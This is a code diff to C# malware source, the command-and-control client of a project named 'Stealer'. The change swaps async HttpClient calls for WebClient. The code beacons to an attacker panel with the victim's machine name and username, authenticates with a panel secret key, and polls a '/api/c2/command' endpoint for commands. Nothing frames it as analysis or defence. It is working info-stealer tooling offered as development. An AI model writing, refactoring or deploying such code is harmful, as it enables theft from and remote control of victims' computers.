@@ -1,58 +1,54 @@
 using System;
-using System.IO;
 using System.Net;
-using System.Net.Http;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace Stealer.Utils
 {
     public static class C2Client
     {
-        private static readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
+        private static string _baseUrl;
 
         private static string BaseUrl
         {
             get
             {
+                if (_baseUrl != null) return _baseUrl;
                 Config.Initialize();
                 string url = Config.PanelUrl.TrimEnd('/');
                 int idx = url.LastIndexOf("/api/upload");
                 if (idx > 0) url = url.Substring(0, idx);
-                return url;
+                _baseUrl = url;
+                return _baseUrl;
             }
         }
 
-        public static async Task SendHeartbeat(string clientId)
+        public static void SendHeartbeat(string clientId)
         {
-            var req = new HttpRequestMessage(HttpMethod.Post, BaseUrl + "/api/c2/heartbeat");
-            req.Content = new StringContent(
-                "{\"client_id\":\"" + Escape(clientId) + "\",\"hostname\":\"" + Escape(Environment.MachineName) + "\",\"username\":\"" + Escape(Environment.UserName) + "\"}",
-                Encoding.UTF8, "application/json");
-
+            var wc = new WebClient();
+            wc.Headers[HttpRequestHeader.ContentType] = "application/json";
             if (!string.IsNullOrEmpty(Config.SecretKey))
-                req.Headers.TryAddWithoutValidation("x-panel-key", Config.SecretKey);
+                wc.Headers["x-panel-key"] = Config.SecretKey;
 
-            await _http.SendAsync(req);
+            string json = "{\"client_id\":\"" + Escape(clientId) +
+                          "\",\"hostname\":\"" + Escape(Environment.MachineName) +
+                          "\",\"username\":\"" + Escape(Environment.UserName) + "\"}";
+
+            wc.UploadString(BaseUrl + "/api/c2/heartbeat", json);
         }
 
-        public static async Task<string> PollCommand(string clientId)
+        public static string PollCommand(string clientId)
         {
-            var req = new HttpRequestMessage(HttpMethod.Get, BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId));
-
+            var wc = new WebClient();
             if (!string.IsNullOrEmpty(Config.SecretKey))
-                req.Headers.TryAddWithoutValidation("x-panel-key", Config.SecretKey);
+                wc.Headers["x-panel-key"] = Config.SecretKey;
 
-            var resp = await _http.SendAsync(req);
-            if (resp.StatusCode != HttpStatusCode.OK) return null;
-
-            string body = await resp.Content.ReadAsStringAsync();
-            string cmd = ParseJsonKey(body, "command");
-            return cmd;
+            string body = wc.DownloadString(BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId));
+            return ParseJsonKey(body, "command");
         }
 
         private static string Escape(string s)
         {
+            if (s == null) return "";
             return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
         }
 
